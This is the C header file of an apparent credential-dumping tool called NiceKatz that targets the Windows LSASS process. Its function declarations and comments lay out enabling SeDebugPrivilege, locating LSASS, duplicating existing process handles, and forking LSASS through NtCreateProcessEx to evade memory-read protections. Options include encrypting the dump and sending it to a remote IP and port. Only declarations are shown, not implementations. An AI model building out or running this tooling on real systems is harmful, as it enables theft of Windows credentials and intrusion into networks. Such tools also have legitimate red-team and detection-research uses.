#pragma once
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCKAPI_ 
#include <stdio.h>
#include <inttypes.h>
#include <shlwapi.h>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "shlwapi")

typedef NTSTATUS(__stdcall* _RtlAdjustPrivilege)
(
    ULONG    Privilege,
    BOOLEAN  Enable,
    BOOLEAN  CurrentThread,
    PBOOLEAN Enabled
    );  _RtlAdjustPrivilege RtlAdjustPrivilege;

typedef NTSTATUS(__stdcall* _NtCreateProcessEx)
(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
    );  _NtCreateProcessEx NtCreateProcessEx;

enum SYSTEM_INFORMATION_CLASS {
    SystemHandleInformation = 16
};

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct ServerInfo
{
    WCHAR IpAddress[16];
    WCHAR Port[6];
} ServerInfo, * pServerInfo;

typedef struct CommandLineArgs
{
    BOOL bSendRemotly;
    BOOL bEncryptDump;
    BOOL bSilentProcessExit;
    BOOL bMiniDumpWriteDump;
    int TargetgPid;
    ServerInfo ServerInformation;

} CommandLineArgs, * pCommandLineArgs;

/*
* Retrieves and prints the correspondent error message of the last error code
* @param FunctionName - The function name that failed, used for better visibility
*/
void GetError(WCHAR* FunctionName);

/*
* Escalates the access token to have SeDebugPrivilieges enabled
* This is necessary to dump processes such as LSASS, but not necessarily needed for all processes
* @return BOOL - TRUE or FALSE
*/
BOOL GetSeDebugPrivilege();

/*
* Finds the PID of the LSASS process
* @param TargetPid - A pointer to an integer that will recive LSASS PID if retrieved
* * @return BOOL - TRUE or FALSE
*/
BOOL FindLsassPid(int* TargetPid);

/*
* Validates that the wide character string supplied contains only digits
* @param String - A pointer to wide string
* @return BOOL - TRUE or FALSE
*/
BOOL ValidateNumber(WCHAR* String);

/*
* Validates that the wide character string supplied is in a right format of an IP address
* @param IpAddress - A pointer to wide string that represents an IP address
* @return BOOL - TRUE or FALSE
*/
BOOL ValidateIp(WCHAR* IpAddress);

/*
* Validates that the wide character string supplied as command line argument is in the format the program requires
* This function will manage calls to other validation functions such as ValidateNumber() and ValidateIp()
* @param RemoteAddress - A pointer to wide string that represents the remote address to send the dump to (example format - 10.10.10.10:8888)
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL IsValidFormat(WCHAR* RemoteAddress, pCommandLineArgs pCmdArgs);

/*
* Prints the usage menu
*/
void Usage();

/*
* Parses the supplied command line arguments and assigns user choice flags to the pCmdArgs structure
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL ParseArgs(pCommandLineArgs pCmdArgs);

/*
* Enumerate all open system handles to find an open handles with the desired permissions
* Once a suitable handle is found, the handle will get duplicated for later use by this program
* @param hTarget - A pointer to a HANDLE variable which will recieve the duplicated handle value
* @param TargetPid - A pointer to an integer that represents the target PID to dump
* @param dwDesiredPermissions - A double word that represents the requested permissions of the handle to be duplicated. (For more info regarding handle access rights: https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
* @return BOOL - TRUE or FALSE
*/
BOOL Duplicate(HANDLE* hTarget, int* TargetPid, DWORD dwDesiredPermissions);

/*
* Forks the target remote process to avoid direct memory reading of the target process
* In cases of which LSASS is the target process, it is more likely that LSASS will be protected from direct memory reading
* This function solves this issue by forking the remote process, meaning all of the target's properties (including its memory space) will be duplicated to a new different child process
* @param hTarget - An existing handle that have at least PROCESS_CREATE_PROCESS permissions
* @param hTargetForked - A pointer to HANDLE which will receive the handle to the new forked process, this handle can be used for further dumping operations
* @return BOOL - TRUE or FALSE
*/
BOOL ForkRempteProcess(HANDLE hTarget, HANDLE* hTargetForked);